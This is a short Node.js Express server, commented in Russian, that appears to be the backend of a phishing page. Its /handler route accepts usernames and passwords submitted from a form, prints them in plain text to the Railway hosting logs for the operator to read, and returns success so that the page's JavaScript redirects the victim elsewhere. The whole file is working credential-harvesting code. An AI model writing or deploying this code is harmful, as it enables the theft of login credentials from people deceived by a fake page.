const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;

// Поддержка JSON и данных из форм
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Раздача статики из папки public
app.use(express.static(path.join(__dirname, 'public')));

// Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Обработчик данных (POST запрос от формы)
app.post('/handler', (req, res) => {
    const { username, password } = req.body;
    
    // Эти данные ты увидишь в логах Railway
    console.log('--- НОВЫЕ ДАННЫЕ ---');
    console.log(`Логин: ${username}`);
    console.log(`Пароль: ${password}`);
    console.log('--------------------');

    // Отвечаем браузеру, чтобы сработал редирект в JS
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});